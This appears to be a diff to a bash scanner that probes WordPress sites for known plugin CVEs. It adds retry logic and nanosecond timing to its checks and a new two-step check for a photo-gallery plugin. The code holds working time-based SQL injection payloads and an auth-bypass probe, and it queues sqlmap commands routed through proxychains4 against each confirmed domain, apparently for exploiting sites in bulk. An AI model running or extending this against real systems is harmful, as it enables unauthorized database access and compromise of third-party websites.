@@ -56,16 +56,21 @@ add_sqlmap() { flock -x "$SQLMAP_FILE" -c "echo '$1' >> '$SQLMAP_FILE'"; }
 
 time_check() {
     local URL="$1" METHOD="${2:-GET}" DATA="${3:-}" SL="${4:-$SLEEP_SEC}"
-    local START; START=$(date +%s)
+    local START END
+    START=$(date +%s%N)
     curl -sk -A "$UA" -o /dev/null -m $((SL+TIMEOUT)) -X "$METHOD" ${DATA:+--data "$DATA"} "$URL" 2>/dev/null || true
-    echo $(( $(date +%s) - START ))
+    END=$(date +%s%N)
+    # Round to nearest second (add 500ms) to avoid truncation false-negatives
+    echo $(( (END - START + 500000000) / 1000000000 ))
 }
 
 time_check_h() {
     local URL="$1" METHOD="${2:-GET}" DATA="${3:-}" HDR="${4:-}" SL="${5:-$SLEEP_SEC}"
-    local START; START=$(date +%s)
+    local START END
+    START=$(date +%s%N)
     curl -sk -A "$UA" -o /dev/null -m $((SL+TIMEOUT)) -H "$HDR" -X "$METHOD" ${DATA:+--data "$DATA"} "$URL" 2>/dev/null || true
-    echo $(( $(date +%s) - START ))
+    END=$(date +%s%N)
+    echo $(( (END - START + 500000000) / 1000000000 ))
 }
 
 http_probe() {
@@ -96,16 +101,30 @@ replay_nuclei_url() {
 
     # 1. Time-based: URL has SLEEP payload embedded (GET SQLi)
     if [[ "$NUCLEI_URL" =~ [Ss][Ll][Ee][Ee][Pp][\(%28]|%53%4[Cc]%45%45%50|SELECT.*SLEEP ]]; then
-        local START DUR
-        START=$(date +%s)
+        local START END DUR
+        START=$(date +%s%N)
         curl -sk -A "$UA" -o /dev/null -m $((SLEEP_SEC+TIMEOUT)) "$NUCLEI_URL" 2>/dev/null || true
-        DUR=$(( $(date +%s) - START ))
+        END=$(date +%s%N)
+        DUR=$(( (END - START + 500000000) / 1000000000 ))
         if [ "$DUR" -ge "$THRESHOLD" ]; then
             log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "nuclei-replay GET sleep=${DUR}s" "sqli"
             add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u '${NUCLEI_URL}' --technique=T --dbms=MySQL --batch"
             return 0
         fi
-        echo -e "${GREEN}  nuclei-replay: no delay (${DUR}s) — site down or FP${NC}"
+        # Second attempt with double timeout for slow/WAF-throttled sites
+        echo -e "${YELLOW}  nuclei-replay: ${DUR}s < threshold, retry x2...${NC}"
+        START=$(date +%s%N)
+        curl -sk -A "$UA" -o /dev/null -m $((SLEEP_SEC*2+TIMEOUT)) "$NUCLEI_URL" 2>/dev/null || true
+        END=$(date +%s%N)
+        DUR=$(( (END - START + 500000000) / 1000000000 ))
+        if [ "$DUR" -ge "$THRESHOLD" ]; then
+            log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "nuclei-replay GET sleep=${DUR}s (retry)" "sqli"
+            add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u '${NUCLEI_URL}' --technique=T --dbms=MySQL --batch"
+            return 0
+        fi
+        echo -e "${YELLOW}  nuclei-replay: no delay (${DUR}s) — running custom check${NC}"
+        # Nuclei confirmed SLEEP injection → trust plugin presence for custom check
+        NUCLEI_TRUST=1
         return 1
     fi
 
@@ -183,10 +202,12 @@ check_time_post_json() {
     if [ -n "$PLUGIN" ] && ! plugin_check "$BASE_URL" "$PLUGIN"; then
         echo -e "${RED}  Plugin not found${NC}"; return
     fi
-    local START; START=$(date +%s)
+    local START END
+    START=$(date +%s%N)
     curl -sk -A "$UA" -o /dev/null -m $((SLEEP_SEC+TIMEOUT)) -X POST \
         -H "Content-Type: application/json" --data "$BODY" "${BASE_URL}${ENDPOINT}" 2>/dev/null || true
-    local DUR=$(( $(date +%s) - START ))
+    END=$(date +%s%N)
+    local DUR=$(( (END - START + 500000000) / 1000000000 ))
     if [ "$DUR" -ge "$THRESHOLD" ]; then
         log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "POST JSON time-based sleep=${DUR}s" "sqli"
         add_sqlmap "# ${CVE}: sqlmap -u '${BASE_URL}${ENDPOINT}' --data='${BODY}' --technique=T --dbms=MySQL --batch"
@@ -274,7 +295,36 @@ _check_CVE_2020_27481() { check_time_post "$1" "$2" 'CVE-2020-27481' 'good-learn
 _check_CVE_2020_27615() { check_time_post "$1" "$2" 'CVE-2020-27615' 'loginizer' '/wp-login.php' "log='%2cip%3dLEFT(UUID()%2c8)%2curl%3dif(1%3d1%2csleep(7)%2c0)%23&pwd=x&wp-submit=Login&redirect_to=&testcookie=1"; }
 _check_CVE_2020_5766() { check_plugin_only "$1" "$2" 'CVE-2020-5766' 'srs-simple-hits-counter'; }
 _check_CVE_2020_8772() { check_plugin_only "$1" "$2" 'CVE-2020-8772' 'iwp-client'; }
-_check_CVE_2021_24139() { check_time_get "$1" "$2" 'CVE-2021-24139' 'photo-gallery' '/index.php?rest_route=/wp/v2/pages'; }
+_check_CVE_2021_24139() {
+    local BASE_URL="$1" DOMAIN="$2" CVE="CVE-2021-24139"
+    echo -e "\n${YELLOW}[${CVE}] 10Web Photo Gallery — bwg_search SQLi (2-step)${NC}"
+    if [ "${NUCLEI_TRUST:-0}" != "1" ] && ! plugin_check "$BASE_URL" "photo-gallery"; then
+        echo -e "${RED}  Plugin not found${NC}"; return
+    fi
+    # Step 1: find a page slug that renders a gallery (has bwg in content)
+    local PAGES SLUG=""
+    PAGES=$(curl -sk -A "$UA" -m "$TIMEOUT" "${BASE_URL}/index.php?rest_route=/wp/v2/pages&per_page=20" 2>/dev/null || echo "")
+    # Try to extract slug of page containing a bwg gallery (grep for bwg before the slug)
+    # JSON order: rendered content comes before "slug" in each page object — so search backward
+    SLUG=$(echo "$PAGES" | grep -oP '(?<="slug":")[^"]+' | head -1)
+    # If pages contain bwg in rendered content, try to find better slug
+    local BWG_SLUG
+    BWG_SLUG=$(echo "$PAGES" | grep -B5 '"bwg\|bwg_' | grep -oP '(?<="slug":")[^"]+' | head -1)
+    [ -n "$BWG_SLUG" ] && SLUG="$BWG_SLUG"
+    # Try injection on found slug, or on root if no slug
+    local ENDPOINTS=()
+    [ -n "$SLUG" ] && ENDPOINTS+=("/${SLUG}/?bwg_search_0=%22%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4846%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%28${SLEEP_SEC}%29%29%29a%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%22x%22%2F%2A%2A%2FLIKE%2F%2A%2A%2F%22x")
+    ENDPOINTS+=("/?bwg_search_0=%22%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4846%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%28${SLEEP_SEC}%29%29%29a%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%22x%22%2F%2A%2A%2FLIKE%2F%2A%2A%2F%22x")
+    for EP in "${ENDPOINTS[@]}"; do
+        local DUR; DUR=$(time_check "${BASE_URL}${EP}")
+        if [ "$DUR" -ge "$THRESHOLD" ]; then
+            log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "bwg_search SQLi sleep=${DUR}s" "sqli"
+            add_sqlmap "# ${CVE}: sqlmap -u '${BASE_URL}${EP}' -p bwg_search_0 --technique=T --dbms=MySQL --batch"
+            return
+        fi
+    done
+    log_safe "$DOMAIN" "$CVE" "no delay"
+}
 _check_CVE_2021_24285() { check_plugin_only "$1" "$2" 'CVE-2021-24285' 'cars-seller-auto-classifieds-script'; }
 _check_CVE_2021_24295() { check_plugin_only "$1" "$2" 'CVE-2021-24295' 'cleantalk-spam-protect'; }
 _check_CVE_2021_24340() { check_time_get "$1" "$2" 'CVE-2021-24340' 'wp-statistics' '/wp-admin/admin.php?page=wps_pages_page&ID=0+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))test)&type=home'; }
@@ -723,9 +773,31 @@ _check_CVE_2023_2449() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-2449"
     echo -e "\n${YELLOW}[${CVE}] UserPro — plaintext token${NC}"
     if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
-    local RESP; RESP=$(http_probe "${BASE_URL}/?up_activate=1&key=probe&user_id=1")
-    local STATUS=$(echo "$RESP"|tail -1)
-    if [ "$STATUS" = "200" ] && ! echo "$RESP"|head -n -1|grep -qi "Invalid|expired|404"; then log_vuln "$DOMAIN" "$CVE" "LIKELY" "activation endpoint accessible (200)" "auth-bypass"; else log_safe "$DOMAIN" "$CVE" "activation blocked"; fi
+    # Try both endpoints nuclei uses (stop-at-first-match)
+    local RESP BODY STATUS
+    RESP=$(http_probe "${BASE_URL}/wp-login.php?action=rp&key=probe&login=admin")
+    BODY=$(echo "$RESP"|head -n -1); STATUS=$(echo "$RESP"|tail -1)
+    if [ "$STATUS" = "200" ] && echo "$BODY"|grep -qi "password" && ! echo "$BODY"|grep -qi "Invalid key"; then
+        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "wp-login rp: password reset exposed (nuclei-match)" "auth-bypass"
+        return
+    fi
+    RESP=$(http_probe "${BASE_URL}/?up_activate=1&key=probe&user_id=1")
+    BODY=$(echo "$RESP"|head -n -1); STATUS=$(echo "$RESP"|tail -1)
+    if [ "$STATUS" = "200" ] && echo "$BODY"|grep -qiE "userpro|up_activate|token"; then
+        # nuclei matcher: body contains userpro/up_activate/token → vulnerable endpoint confirmed
+        local LEVEL="CONFIRMED"
+        [ "${NUCLEI_TRUST:-0}" != "1" ] && LEVEL="LIKELY"
+        log_vuln "$DOMAIN" "$CVE" "$LEVEL" "activation endpoint: body matches nuclei pattern (200)" "auth-bypass"
+    elif [ "$STATUS" = "200" ] && ! echo "$BODY"|grep -qi "Invalid|expired|404"; then
+        # If nuclei already confirmed → CONFIRMED; otherwise LIKELY (no real key to verify)
+        if [ "${NUCLEI_TRUST:-0}" = "1" ]; then
+            log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "activation endpoint live (nuclei verified)" "auth-bypass"
+        else
+            log_vuln "$DOMAIN" "$CVE" "LIKELY" "activation endpoint accessible (200)" "auth-bypass"
+        fi
+    else
+        log_safe "$DOMAIN" "$CVE" "activation blocked"
+    fi
 }
 _check_CVE_2023_2437() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-2437"
